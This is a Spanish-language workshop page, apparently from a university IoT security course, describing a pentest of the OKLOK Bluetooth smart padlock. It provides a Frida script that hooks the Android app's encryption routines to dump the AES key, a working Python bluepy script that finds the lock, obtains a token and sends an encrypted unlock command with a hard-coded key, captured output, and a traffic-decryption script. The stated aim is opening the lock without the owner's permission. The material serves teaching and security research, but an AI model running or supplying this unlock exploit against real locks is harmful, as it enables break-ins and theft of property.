<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        
        
        
        <link rel="shortcut icon" href="../img/favicon.ico">
        <title>hack-the-lock - Robotarium-FDI</title>
        <link href="../css/bootstrap.min.css" rel="stylesheet">
        <link href="../css/font-awesome.min.css" rel="stylesheet">
        <link href="../css/base.css" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/styles/github.min.css">

        <script src="../js/jquery-1.10.2.min.js" defer></script>
        <script src="../js/bootstrap.min.js" defer></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js"></script>
        <script>hljs.initHighlightingOnLoad();</script> 
    </head>

    <body>
        <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-primary">
            <div class="container">
                <a class="navbar-brand" href="..">Robotarium-FDI</a>
                <!-- Expander button -->
                <button type="button" class="navbar-toggler" data-toggle="collapse" data-target="#navbar-collapse">
                    <span class="navbar-toggler-icon"></span>
                </button>

                <!-- Expanded navigation -->
                <div id="navbar-collapse" class="navbar-collapse collapse">
                        <!-- Main navigation -->
                        <ul class="nav navbar-nav">
                            <li class="navitem">
                                <a href=".." class="nav-link">IX Semana Informática</a>
                            </li>
                            <li class="navitem active">
                                <a href="./" class="nav-link">hack-the-lock</a>
                            </li>
                        </ul>

                    <ul class="nav navbar-nav ml-auto">
                        <li class="nav-item">
                            <a href="#" class="nav-link" data-toggle="modal" data-target="#mkdocs_search_modal">
                                <i class="fa fa-search"></i> Search
                            </a>
                        </li>
                            <li class="nav-item">
                                <a rel="prev" href=".." class="nav-link">
                                    <i class="fa fa-arrow-left"></i> Previous
                                </a>
                            </li>
                            <li class="nav-item">
                                <a rel="next" class="nav-link disabled">
                                    Next <i class="fa fa-arrow-right"></i>
                                </a>
                            </li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="container">
            <div class="row">
                    <div class="col-md-3"><div class="navbar-light navbar-expand-md bs-sidebar hidden-print affix" role="complementary">
    <div class="navbar-header">
        <button type="button" class="navbar-toggler collapsed" data-toggle="collapse" data-target="#toc-collapse" title="Table of Contents">
            <span class="fa fa-angle-down"></span>
        </button>
    </div>

    
    <div id="toc-collapse" class="navbar-collapse collapse card bg-secondary">
        <ul class="nav flex-column">
            
            <li class="nav-item" data-level="1"><a href="#pentest-candado-bluetooth-oklok" class="nav-link">Pentest candado Bluetooth OKLOK</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            
            <li class="nav-item" data-level="1"><a href="#material-necesario" class="nav-link">Material necesario</a>
              <ul class="nav flex-column">
            <li class="nav-item" data-level="2"><a href="#virtualbox-ubuntu-mate-1804-64b" class="nav-link">VirtualBox Ubuntu Mate 18.04 64b</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            <li class="nav-item" data-level="2"><a href="#raspberry-pi-android-9-lineageos-160" class="nav-link">Raspberry Pi Android 9 (LineageOS 16.0)</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            <li class="nav-item" data-level="2"><a href="#apks-y-utilidades" class="nav-link">Apks y utilidades</a>
              <ul class="nav flex-column">
              </ul>
            </li>
              </ul>
            </li>
        </ul>
    </div>
</div></div>
                    <div class="col-md-9" role="main">

<h1 id="pentest-candado-bluetooth-oklok">Pentest candado Bluetooth OKLOK</h1>
<p>El objetivo de este Test de Penetración (Pentest) consiste en ver si somos capaces de <strong>encontrar la clave de desbloqueo</strong> de un candado inteligente para poder <strong>abrirlo</strong> mediante conexión <strong>bluetooth</strong> sin permiso del usuario.</p>
<p align="center">
<img src="oklok.png"  width="60%" height="30%">
</p>

<p>El candado objetivo, modelo <strong>OKLOK Padlock</strong>, es un candado que se puede desbloquear mediante huella digital y usando una <a href="https://play.google.com/store/apps/details?id=com.oklok.lock&amp;hl=en&amp;gl=US">App Android</a> diseñada para tal efecto. </p>
<p>Las versiones antiguas del candado tienen una vulnerabilidad conocida y documentada (<a href="https://eprints.ucm.es/62476/1/JESUS_ALBERTO_TEJEDOR_DORIA_Entrega_Final_TFM_Pentesting_Device_IoT_Smart_Doorlock_4286353_1929042718.pdf">TFM Jesus Alberto Tejedor Doria, 2020</a>, basado en <a href="https://www.attify.com/iot-security-pentesting">Attify Pentest kit</a>) que permitía <strong>averiguar la clave</strong> de desbloqueo de una manera relativamente sencilla. Sin embargo, el fabricante ha <strong>actualizado la aplicación de Android</strong>, complicando la obtención de dicha clave.</p>
<p>El objetivo de este taller consiste en ser capaces de encontrar la clave de acceso mediante el estudio e instrumentación de la nueva aplicación. Para ello os explicaré cómo se conseguía la clave usando la aplicación antigua (<a href="Pentest_Lock.pdf">M-IoT S&amp;L P2: Pentest_Lock</a>), con la esperanza de que algún hacker sea capaz de obtener claves nuevas de los candados que tenemos en la FDI y así poder volver a utilizar la práctica dentro de la asignatura Seguridad y Legalidad del Máster de IoT. </p>
<p>Existe otro agujero de seguridad documentado que puede resultar de utilidad: </p>
<ul>
<li><a href="https://github.com/securelayer7/pwnfb50">Transfer ownership of any FB50 smart lock to yourself (CVE-2019-13143)</a></li>
<li><a href="https://blog.securelayer7.net/fb50-smart-lock-vulnerability-disclosure/">FB50 Smart Lock Vulnerability Disclosure (CVE-2019-13143)</a></li>
<li><a href="https://icyphox.sh/blog/fb50/">Picking the FB50 smart lock (CVE-2019-13143)</a></li>
</ul>
<h1 id="material-necesario">Material necesario</h1>
<p>Para intentar replicar el hack necesitaremos un ordenador con Linux instalado y un dispositivo Android <em>rooteado</em>. Para facilitar la tarea os dejo una imagen de una máquina virtual de <strong>Ubuntu Mate</strong> y una imagen de <strong>Android para Raspberry Pi 4</strong>.</p>
<h2 id="virtualbox-ubuntu-mate-1804-64b">VirtualBox Ubuntu Mate 18.04 64b</h2>
<p>En este enlace  <a href="https://drive.google.com/file/d/1eo9bX2aVQekpQcAm2UmuF1QA5-_ZrvyT/view?usp=share_link">Ubuntu Mate 18.04.1 64b</a> os dejo una MV preparada con todo lo que listo a continuación. Para poder descargar el fichero deberéis de estar <strong>identificados</strong> con la cuenta de correo de la <strong>UCM</strong>.</p>
<ul>
<li>
<p>Usuario/contraseña: <code>master_iot</code>/<code>SyL</code></p>
</li>
<li>
<p>Paquetes instalados sobre la versión <em>stock</em>:</p>
</li>
</ul>
<pre><code class="language-bash">sudo apt-get install ubertooth
sudo apt-get install python-pip libglib2.0-dev python-dev
sudo pip install bluepy
sudo pip install pycrypto
sudo pip install pyaes
sudo apt install aapt
sudo apt install apktool
sudo apt install zipalign
sudo apt install python3-pip
sudo pip3 install objection
sudo apt install adb 
sudo apt install default-jdk
</code></pre>
<ul>
<li>Acceso a unidades compartidas con el Host:</li>
</ul>
<pre><code class="language-bash">sudo adduser masteriot vboxsf
</code></pre>
<ul>
<li>
<p>La versión de <code>apk-tool</code> del repositorio (<em>v.v2.4.0-dirty</em>) no parece valerle a <code>objection</code>: <strong>Error</strong> <em>apktool version should be at least 2.4.1</em>.
  Copiamos <a href="https://ibotpeaches.github.io/Apktool/install/">apk-tool v2.4.1</a> en <code>~/bin</code> y mantenemos el paquete, ya que instala algo necesario (no he localizado el qué).</p>
</li>
<li>
<p><a href="https://launchpad.net/~wireshark-dev/+archive/ubuntu/stable"><em>Wireshark</em> actualizado</a> y sin privilegios (requiere <code>logout</code>). Wireshark permite monitorizar la red del Host si se configura en modo <code>bridged</code> y con la configuración <code>Promiscuous mode: Allow all.</code></p>
</li>
</ul>
<pre><code class="language-bash">sudo add-apt-repository ppa:wireshark-dev/stable
sudo apt-get update
sudo apt-get install wireshark
sudo dpkg-reconfigure wireshark-common
sudo addgroup masteriot wireshark
</code></pre>
<ul>
<li><a href="https://www.bettercap.org/">Bettercap</a>:<ul>
<li>Descargar y copiar el binario precompilado en <code>/sbin/</code>, necesita librerías</li>
</ul>
</li>
<li><a href="https://github.com/skylot/jadx">Jadx</a>:<ul>
<li>Descargar y copiar en <code>/opt/jadx-1.1.0</code></li>
<li><strong>Nota:</strong> este programa consume muchos recursos, asignar 4GiB y 2 CPUs en la MV</li>
</ul>
</li>
</ul>
<pre><code class="language-bash">sudo apt-get install libpcap-dev libnetfilter-queue-dev
</code></pre>
<h2 id="raspberry-pi-android-9-lineageos-160">Raspberry Pi Android 9 (LineageOS 16.0)</h2>
<ul>
<li>Enlace a la imagen original <a href="https://drive.google.com/file/d/1FepSgPTNmIe9RXJRf8kPZBdfw4rda9RY/view?usp=share_link">LineageOS 16.0</a>. Para poder descargar el fichero deberéis de estar <strong>identificados</strong> con la cuenta de correo de la <strong>UCM</strong>.</li>
<li>Manual: <a href="https://konstakang.com/devices/rpi3/LineageOS16.0/">LineageOS 16.0 (Android 9)</a></li>
<li>Necesario conectar un monitor HDMI sin adaptador, o configurar a mano la resolución según manual.</li>
<li>Pasos del manual necesarios:<ul>
<li>Habilitar opciones de desarrollador</li>
<li>Habilitar acceso de <em>root</em></li>
</ul>
</li>
<li>Otras consideraciones:<ul>
<li>Botón de apagado: F5</li>
<li>Es necesario activar <em>adb</em> por red</li>
<li>Habilitar log bluetooth</li>
</ul>
</li>
<li>Servidor frida:  <a href="frida-server-14.2.8-android-arm">frida-server-14.2.8-android-arm</a> </li>
</ul>
<h2 id="apks-y-utilidades">Apks y utilidades</h2>
<h3 id="android-apk">Android Apk</h3>
<p>Os dejo dos versiones antiguas de la <strong>App Oklok</strong> que no están muy ofuscadas:</p>
<ul>
<li><a href="oklok_v1.3.0.apk">oklok_v1.3.0.apk</a> </li>
<li><a href="oklok_v1.5.7.apk">oklok_v1.5.7.apk</a> </li>
</ul>
<h3 id="script-frida">Script Frida</h3>
<p>Script para <strong>conseguir la clave</strong> mediante Frida:</p>
<pre><code class="language-java">Java.perform(function () 
{
    var CMDUtils = Java.use('com.coolu.blelibrary.utils.CMDUtils');

    var log_byte_array = function (arr) {
        var result = &quot;&quot;;
        var buffer = Java.array('byte', arr);
        for(var i = 0; i &lt; buffer.length; ++i)  {
            var hexb = (buffer[i] &amp; 0xFF).toString(16);
            if (hexb.length == 1) hexb = '0' + hexb;
            result += hexb;
        }
        console.log(result);
    };

    CMDUtils.Encrypt.implementation = function (pt, key) {
        console.log('[+] Inside Encrypt()  ======');
        var ct = this.Encrypt(pt, key);
        console.log('Pt:')
        log_byte_array(pt)
        console.log('key:')
        log_byte_array(key);
        return ct;
    };

    CMDUtils.Decrypt.implementation = function (ct, key) {
        console.log('[+] Inside Decrypt()  ======');
        var pt = this.Decrypt(ct, key);
        console.log('Pt:')
        log_byte_array(pt)
        console.log('Key:')
        log_byte_array(key);
        return pt;
    };
});
</code></pre>
<h3 id="script-de-apertura">Script de apertura</h3>
<p>Script <strong>Python 2</strong> para abrir el candado (una vez que <strong>conocemos la clave AES</strong>):</p>
<pre><code class="language-python">from bluepy.btle import Scanner, Peripheral, DefaultDelegate
from Crypto.Cipher import AES

AESKEY = '034100624f0a29355c193f1a39192356'

class MyDelegate(DefaultDelegate):
    def __init__(self):
        DefaultDelegate.__init__(self)
        self.token = None
    def handleNotification(self, cHandle, data):
        cipher = AES.new(AESKEY.decode('hex'), AES.MODE_ECB)
        pt = cipher.decrypt(data)

        if pt.startswith('\x06\x02\x07'):
            self.token = pt[3:7]
            print '[+] Token:', self.token.encode('hex')
def connect(addr):
    print '[+] Connecting'
    p = Peripheral(addr)

    write_char = p.getCharacteristics(uuid='000036f5-0000-1000-8000-00805f9b34fb')[0]
    notify_char = p.getCharacteristics(uuid='000036f6-0000-1000-8000-00805f9b34fb')[0]  

    # Enable notifications, https://stackoverflow.com/a/15722811
    p.writeCharacteristic(7, '0100'.decode('hex'), withResponse=True)

    d = MyDelegate()
    p.withDelegate(d)

    gettokencmd = '06010101' + '0'*24
    gettokstr = AES.new(AESKEY.decode('hex'), AES.MODE_ECB).encrypt(gettokencmd.decode('hex'))

    print '[+] Sending GET_TOKEN command'
    write_char.write(gettokstr, withResponse=True)

    p.waitForNotifications(2)

    if d.token != None:
        cipher = AES.new(AESKEY.decode('hex'), AES.MODE_ECB)

        # Send unlock command
        pt = '050106303030303030'.decode('hex') + d.token + '\x00\x00\x00'      
        write_char.write(cipher.encrypt(pt))
        print '[+] Sent unlock command'
def main():
    s = Scanner()
    print '[+] Scanning for 5s...'
    s.scan(5)

    for dev in s.getDevices():  
        if dev.getValueText(0x9) == 'BlueFPL':
            print '[+] Found OKLOK'
            connect(dev.addr)
            break            
if __name__ == '__main__':
    main()
</code></pre>
<h3 id="analisis-de-trafico-bt-de-una-secuencia-de-apertura">Análisis de tráfico BT de una secuencia de apertura</h3>
<p>Ejemplo de captura y análisis de tráfico mediante Wireshark:  <a href="btsnoop_hci.log">btsnoop_hci.log</a> </p>
<p>Salida de Frida por pantalla:</p>
<pre><code class="language-bash">$ frida -U -l oklok-frida_new.js com.oklok.y
     ____
    / _  |   Frida 14.2.8 - A world-class dynamic instrumentation toolkit
   | (_| |
    &gt; _  |   Commands:
   /_/ |_|       help      -&gt; Displays the help system
   . . . .       object?   -&gt; Display information about 'object'
   . . . .       exit/quit -&gt; Exit
   . . . .
   . . . .   More info at https://www.frida.re/docs/home/

[VirtualBox::com.oklok.y]-&gt;
[VirtualBox::com.oklok.y]-&gt; 
[+] Inside Encrypt()  ======
Pt:
060101015705162b7c5b34162b4b4b2e    --&gt;  Traza Nº 101
key:
034100624f0a29355c193f1a39192356
[+] Inside Encrypt()  ======
Pt:
0602077464a8bd010205000000000000    --&gt;  Traza Nº 103
Key:
034100624f0a29355c193f1a39192356
[+] Inside Decrypt()  ======
Pt:
06010101644c391e5b6a4f3237477a78    --&gt;  Traza Nº 105
key:
034100624f0a29355c193f1a39192356
[+] Inside Decrypt()  ======
Pt:
0602077464a8bd010205000000000000    --&gt;  Traza Nº 107
Key:
034100624f0a29355c193f1a39192356
[+] Inside Encrypt()  ======
Pt:
020101017464a8bd2f22114d0c157e65    --&gt;  Traza Nº 109
key:
034100624f0a29355c193f1a39192356
[+] Inside Decrypt()  ======
Pt:
0202015e64a8bd010205000000000000    --&gt;  Traza Nº 112
Key:
034100624f0a29355c193f1a39192356
[+] Inside Encrypt()  ======
Pt:
0501063030303030307464a8bd1f0375    --&gt;  Traza Nº 113
key:
034100624f0a29355c193f1a39192356
[+] Inside Decrypt()  ======
Pt:
0502010064a8bd010205000000000000    --&gt;  Traza Nº 121
Key:
034100624f0a29355c193f1a39192356
[+] Inside Decrypt()  ======
Pt:
050d010064a8bd010205000000000000    --&gt;  Traza Nº 123
Key:
034100624f0a29355c193f1a39192356
Process terminated
[VirtualBox::com.oklok.y]-&gt;

</code></pre>
<p>Script de Python 2 análisis de trazas:</p>
<pre><code class="language-python">#!/usr/bin/python2.7

from Crypto.Cipher import AES
import binascii

aeskey=&quot;034100624f0a29355c193f1a39192356&quot;
aesobj = AES.new(aeskey.decode(&quot;hex&quot;), AES.MODE_ECB)

wiresharkpacket = &quot;64642f5d28a845260d9c3b7464d1003f&quot;
print &quot;Traza 101: &quot; + str(aesobj.decrypt(wiresharkpacket.decode(&quot;hex&quot;)).encode('hex'))

wiresharkpacket = &quot;b7375edcb4311b888c78b794fa828853&quot;
print &quot;Traza 103: &quot; + str(aesobj.decrypt(wiresharkpacket.decode(&quot;hex&quot;)).encode('hex'))

wiresharkpacket = &quot;d349035cb778578f78761a9b6b2344fd&quot;
print &quot;Traza 105: &quot; + str(aesobj.decrypt(wiresharkpacket.decode(&quot;hex&quot;)).encode('hex'))

wiresharkpacket = &quot;b7375edcb4311b888c78b794fa828853&quot;
print &quot;Traza 107: &quot; + str(aesobj.decrypt(wiresharkpacket.decode(&quot;hex&quot;)).encode('hex'))

wiresharkpacket = &quot;e2608fd9ec82d3f082962256188ca320&quot;
print &quot;Traza 109: &quot; + str(aesobj.decrypt(wiresharkpacket.decode(&quot;hex&quot;)).encode('hex'))

wiresharkpacket = &quot;7c961523beeabc82b97305e1facb1d41&quot;
print &quot;Traza 112: &quot; + str(aesobj.decrypt(wiresharkpacket.decode(&quot;hex&quot;)).encode('hex'))

wiresharkpacket = &quot;62a0972768b33fbe2fb95456c36b9bf6&quot;
print &quot;Traza 113: &quot; + str(aesobj.decrypt(wiresharkpacket.decode(&quot;hex&quot;)).encode('hex'))

wiresharkpacket = &quot;71dda074a979da25e1b51f51d8689a72&quot;
print &quot;Traza 121: &quot; + str(aesobj.decrypt(wiresharkpacket.decode(&quot;hex&quot;)).encode('hex'))

wiresharkpacket = &quot;e8a8855bb311de5ad1d12e79a5206d89&quot;
print &quot;Traza 123: &quot; + str(aesobj.decrypt(wiresharkpacket.decode(&quot;hex&quot;)).encode('hex'))
</code></pre></div>
            </div>
        </div>

        <footer class="col-md-12">
            <hr>
            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
        </footer>
        <script>
            var base_url = "..",
                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
        </script>
        <script src="../js/base.js" defer></script>
        <script src="../search/main.js" defer></script>

        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-lg">
        <div class="modal-content">
            <div class="modal-header">
                <h4 class="modal-title" id="searchModalLabel">Search</h4>
                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
            </div>
            <div class="modal-body">
                <p>From here you can search these documents. Enter your search terms below.</p>
                <form>
                    <div class="form-group">
                        <input type="search" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
                    </div>
                </form>
                <div id="mkdocs-search-results" data-no-results-text="No results found"></div>
            </div>
            <div class="modal-footer">
            </div>
        </div>
    </div>
</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="keyboardModalLabel" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h4 class="modal-title" id="keyboardModalLabel">Keyboard Shortcuts</h4>
                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
            </div>
            <div class="modal-body">
              <table class="table">
                <thead>
                  <tr>
                    <th style="width: 20%;">Keys</th>
                    <th>Action</th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td class="help shortcut"><kbd>?</kbd></td>
                    <td>Open this help</td>
                  </tr>
                  <tr>
                    <td class="next shortcut"><kbd>n</kbd></td>
                    <td>Next page</td>
                  </tr>
                  <tr>
                    <td class="prev shortcut"><kbd>p</kbd></td>
                    <td>Previous page</td>
                  </tr>
                  <tr>
                    <td class="search shortcut"><kbd>s</kbd></td>
                    <td>Search</td>
                  </tr>
                </tbody>
              </table>
            </div>
            <div class="modal-footer">
            </div>
        </div>
    </div>
</div>

    </body>
</html>
